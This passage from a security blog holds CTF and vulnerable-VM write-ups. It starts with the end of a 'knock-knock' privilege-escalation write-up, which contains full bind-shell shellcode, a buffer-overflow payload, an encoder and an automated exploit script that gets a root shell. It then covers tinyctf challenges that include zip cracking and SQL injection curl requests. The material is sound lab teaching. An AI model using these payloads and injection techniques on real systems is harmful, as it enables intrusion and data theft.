FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda<span class="nv">$ </span>q
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc

Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
Entry point 0x8048500
There are <span class="m">8</span> program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
&lt;snip&gt;</code></pre></div>


<p>Okay, great. The stack is executable so I could stash the shellcode there. ASLR on the remote machine was enabled, so all I needed was a <code>jmp esp</code> to jump to the shellcode. I found one conveniently located in the binary, but I really had to dig:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>b main
Breakpoint <span class="m">1</span> at 0x8048927
gdb-peda<span class="nv">$ </span>r
&lt;snip&gt;
Breakpoint 1, 0x08048927 in main <span class="o">()</span>
gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xe4&quot;</span> all
Searching <span class="k">for</span> <span class="s1">&#39;\xff\xe4&#39;</span> in: all ranges
Found <span class="m">96</span> results, display max <span class="m">96</span> items:
       tfc : 0x8048e93 --&gt; 0xe4ff
       tfc : 0x8049e93 --&gt; 0xe4ff 
      libc : 0xf7e18a85 --&gt; 0x7f1be4ff 
      libc : 0xf7e4fdad <span class="o">(</span>jmp    esp<span class="o">)</span>
      libc : 0xf7f6deb3 --&gt; 0xffffe4ff 
&lt;snip&gt;
gdb-peda<span class="nv">$ </span>x/i 0x8048e93
   0x8048e93:   jmp    esp</code></pre></div>


<p>With that hurdle taken, I first verified the exploit by making the shellcode a bunch of <code>int 3</code>s. This made <code>tfc</code> crash with SIGTRAP, confirming that it worked. I used <a href="http://shell-storm.org/shellcode/files/shellcode-672.php">bind@64533</a>, my favorite shellcode. Finally, my exploit looked like this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print &quot;A&quot;*4124+ # filler</span>
<span class="s1">   &quot;\x93\x9e\x04\x08&quot;+    # overwrite eip</span>
<span class="s1">   &quot;\x83\xec\x7f&quot; +       # sub esp, 127 to reserve stack space, followed by the shellcode</span>
<span class="s1">   &quot;\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;+</span>
<span class="s1">   &quot;AAAAAAAAAAAAAAAAAAA&quot;  # some padding</span>
<span class="s1">   &#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py</code></pre></div>


<p>This generated the file <code>out2.tfc</code>. I verified the exploit locally, after which I transferred it over to knock-knock. I ran the exploit and connected to <code>localhost:64533</code> with my fingers crossed:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>xxd sploit.tfc <span class="p">|</span>head
0000000: def0 5bab 5df7 ab43 <span class="m">0690</span> fe64 6cb0 0b48  ..<span class="o">[</span>.<span class="o">]</span>..C...dl..H
0000010: <span class="m">2986</span> 416f <span class="m">7467</span> df5c 21a2 453f e5cc 806c  <span class="o">)</span>.Aotg.<span class="se">\!</span>.E?...l
0000020: 2bd0 <span class="m">0142</span> b5c2 <span class="m">2466</span> <span class="m">3525</span> c114 26dc <span class="m">1979</span>  +..B..<span class="nv">$f5</span>%..<span class="p">&amp;</span>..y
0000030: 1dd0 7c53 5b49 3b52 012e 942b 549a fe77  ..<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R...+T..w
0000040: e104 <span class="m">0424</span> cd9f e437 f09c 3f69 <span class="m">0095</span> <span class="m">7727</span>  ...<span class="nv">$.</span>..7..?i..w<span class="err">&#39;</span>
0000050: d017 <span class="m">3307</span> b61e 733c 41f9 8c5e f98c 5e41  ..3...s&lt;A..^..^A
0000060: 9a35 <span class="m">9167</span> ccf8 1f00 a809 c919 309d c241  .5.g........0..A
0000070: 8f7a 207c f8b3 <span class="m">7765</span> 9a72 <span class="m">7417</span> 8b1d 6f00  .z <span class="p">|</span>..we.rt...o.
0000080: b137 a610 ee6c 1a61 966e <span class="m">1438</span> 0c19 e245  .7...l.a.n.8...E
0000090: c7e6 f342 abc1 <span class="m">9363</span> 504c af0b 199e d551  ...B...cPL.....Q
jason@knockknock:~<span class="nv">$ </span>
jason@knockknock:~<span class="nv">$ </span>
jason@knockknock:~<span class="nv">$ </span>./tfc sploit.tfc bleh.tfc <span class="p">&amp;</span>
<span class="o">[</span>1<span class="o">]</span> 3578
jason@knockknock:~<span class="nv">$ </span>nc localhost 64533
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
whoami
root</code></pre></div>


<p>From here, I could view the flag:</p>

<p><img src="http://barrebas.github.io/assets/knockknock-02.png" alt="" /></p>

<p>Game over!</p>

<p>Or was it? leonjza came up with a nice idea, why not use the core dump instead to extract the encrypted payload? I spent some time and came up with the following bash script. It abuses the fact that the encrypted file will start with the same bytes every time. This script generates the exact same payload as before:</p>

<div><script src='https://gist.github.com/b285dd9865fe82188959.js?file=tfc_exploit.sh'></script>
<noscript><pre><code>#!/bin/bash

# exploit for last stage of knockknock vm

echo &quot;[+] building shellcode...&quot;
$(python -c 'print &quot;A&quot;*4124+&quot;\x93\x9e\x04\x08&quot;+&quot;\x83\xec\x7f\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;' &gt; in.tfc)

if [ ! -f in.tfc ];
then
    echo &quot;[!] shellcode not found!&quot;
    exit 1
fi

SPLOIT=in.tfc
SPLOIT_LEN=$(cat $SPLOIT |wc -c)

# enable coredumps
ulimit -c unlimited
# copy the setuid binary
cp ./tfc ./pwn
# use tfc to encode shellcode
./pwn $SPLOIT derp.tfc 2&amp;&gt;/dev/null

if [ -f core ]; then
    echo &quot;[+] core found.&quot; 
    # because of the way the encryption works, the first four 
    # bytes are always def0 5bab. let's abuse this fact.
    SPLOIT_START_HEX=$(xxd core|grep 'def0.5bab'|awk '{print $1}' |tr -d ':')
    SPLOIT_START=$(printf &quot;%d&quot; 0x$SPLOIT_START_HEX)
    echo &quot;[+] found encrypted shellcode at offset $SPLOIT_START&quot;
    echo &quot;[+] extracting... $SPLOIT_LEN&quot;
    dd if=core of=./tfc-sploit.tfc bs=1 skip=$SPLOIT_START count=$SPLOIT_LEN &amp;&gt;/dev/null
    if [ -f tfc-sploit.tfc ]; then
        echo &quot;[+] running exploit. catch the shell at localhost:64533&quot;
        ./tfc ./tfc-sploit.tfc derp.tfc &amp;
    fi
else
    echo &quot;[!] core not found!&quot;
    exit 1
fi

echo &quot;[+] cleaning up. all done!&quot;
rm ./pwn &amp;&gt;/dev/null
rm ./tfc-sploit.tfc &amp;&gt;/dev/null
rm ./in.tfc &amp;&gt;/dev/null
exit 0</code></pre></noscript></div>


<p>I will leave a ROP exploit &lsquo;as an exercise to the reader&rsquo; :) knock-knock was a fun VM and so thanks to zer0w1re and c0ne!</p>

<p>Updated <code>enc.py</code>, contained another error but should be fixed now:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>


<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">infile</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
        
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span>
            
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;usage: {} &lt;infile&gt; &lt;outfile&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">xcrypt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span></code></pre></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tinyctf Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/03/tinyctf/"/>
    <updated>2014-10-03T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/03/tinyctf</id>
    <content type="html"><![CDATA[<p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>

<!--more-->


<h1>misc50</h1>

<p>Clearly, this was <code>brainfuck</code> code! Yay for <code>brainfuck</code>! Unfortunately, this being a CTF, I quickly entered the bf code in an online interpreter, got the flag and did not keep any notes. But yay for <code>bf</code>!</p>

<h1>misc100 aka Janos the Ripper</h1>

<p>The zip file contained a second zip file with a password-protected file called &lsquo;flag&rsquo;. The name of course hinted strongly in the direction of John the Ripper and indeed, JtR made quick work of this password-protected zip file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./zip2john ~/tmp/misc100 &gt; misc100.hashes
/home/bas/tmp/misc100-&gt;flag.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>39, <span class="nv">decmplen</span><span class="o">=</span>25, <span class="nv">crc</span><span class="o">=</span>7788D444
bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./john ./misc100.hashes 
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
fish             <span class="o">(</span>/home/bas/tmp/misc100<span class="o">)</span>
guesses: <span class="m">1</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Mon Sep <span class="m">29</span> 22:14:44 2014<span class="o">)</span>  c/s: <span class="m">388328</span>  trying: marisol - <span class="nb">help</span>
Use the <span class="s2">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</code></pre></div>


<p><code>flag{ev3n::y0u::bru7us?!}</code></p>

<h1>web100</h1>

<p>This challenge presents us again with a file to download, which turns out to be a heavily obfuscated <code>javascript</code> file. Between the javascript statements are strange bytes values, such as <code>0x02</code> or <code>0x01</code>. These are not visible in the code below.</p>

<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">_</span><span class="o">=</span><span class="s1">&#39;function $(){e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\&#39;_ns=[t,n,r,i];for(o=0;o&lt;13;++o){  [0]);.splice(0,1)}}}    \&#39;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#39;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;   write(s[o%4]buttonif(e.ment&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">Y</span> <span class="k">in</span> <span class="nx">$</span><span class="o">=</span><span class="s1">&#39;    &#39;</span><span class="p">)</span><span class="kd">with</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="nx">$</span><span class="p">[</span><span class="nx">Y</span><span class="p">]))</span><span class="nx">_</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nx">pop</span><span class="p">());</span><span class="nb">eval</span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></div>


<p>I had little luck trying to reverse this javascript. I noticed that the entire string is parsed with <code>eval</code> so I just replaced it with <code>alert</code> and ran the javascript. I was presented with the following code, after pulling it through <a href="http://jsbeautifier.org/">jsbeautifier.org</a>:</p>

<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;c&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^be0f23/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/233ac/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/e98aa$/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/c7be9/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;fl&quot;</span><span class="p">,</span> <span class="s2">&quot;s_a&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;e}&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;_h0l&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;g{&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;_0&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;it&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#39;</span><span class="p">);</span>
<span class="k">delete</span> <span class="nx">_</span></code></pre></div>


<p>So the original javascript replaces all the weird bytes and then runs this code, which obviously checks the input. If it is valid, it will unmangle the flag. I was not able to get the proper string, but who cares when I can just run:</p>

<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;fl&quot;</span><span class="p">,</span> <span class="s2">&quot;s_a&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;e}&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;_h0l&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;g{&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;_0&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;it&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="p">}</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#39;</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span></code></pre></div>


<p><code>flag{it's_a_h0le_in_0ne}</code></p>

<h1>web200</h1>

<p>This was a fun one. We&rsquo;re presented with a webpage about rollercoasters and a search box. We can search for values in the name, park or country. This smells like SQLi. I tried a couple of things in the search box, but this got me nowhere. I viewed the source of the webpage and lo-and-behold: it looks like we can specify the column name to be searched ourselves! I switched over to <code>curl</code> to check this. After a bit of fumbling around for the proper syntax, I came up with this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,3,4 -- #&quot;</span>
* About to connect<span class="o">()</span> to 54.69.118.120 port <span class="m">8000</span> <span class="o">(</span><span class="c">#0)</span>
*   Trying 54.69.118.120...
* connected
...snip...
        &lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;content&quot;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;whitebox&quot;</span>&gt;
            &lt;table&gt;
                &lt;tr&gt;
                    &lt;th&gt;
                        Name
                    &lt;/th&gt;
                    &lt;th&gt;
                        Park
                    &lt;/th&gt;
                    &lt;th&gt;
                        Country
                    &lt;/th&gt;
                    &lt;th&gt;
                        Height
                    &lt;/th&gt;
                    
                &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
...snip...</code></pre></div>


<p>You can see that the webpage nicely returns the values 1, 2, 3 and 4, verifying a SQL injection. Next, I assumed MySQL and grabbed the table names:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,table_name,0 from information_schema.tables -- #&quot;</span>
...snip...
&lt;td&gt;setup_timers&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;threads&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;flag&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;rollercoaster&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
...snip...</code></pre></div>


<p>Looks like there is a table named <code>flag</code>! Let&rsquo;s grab column names:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,column_name,0 from information_schema.columns where table_name = &#39;flag&#39; -- #&quot;</span></code></pre></div>


<p>This returned the column <code>hash</code>. Get the flag!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,hash,0 from flag -- #&quot;</span></code></pre></div>


<p><code>flag{unroll_those_loops}</code></p>

<h1>rev100</h1>

<p>Unpacking the zip file gave me a file that looked like the output of <code>xxd</code>:</p>

<div class="highlight"><pre><code class="language-diff" data-lang="diff">00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
004001D0  00 00 00 00 00 0F 05</code></pre></div>


<p>Reversing the process with <code>xxd -r</code> gave me a 4 MB file which didn&rsquo;t really help much. Instead, looking at the address and bytes, I somehow got the feeling this was assembly code. So I extracted all the bytes with some quick &amp; dirty bash-fu (&lsquo;cause ctf):</p>

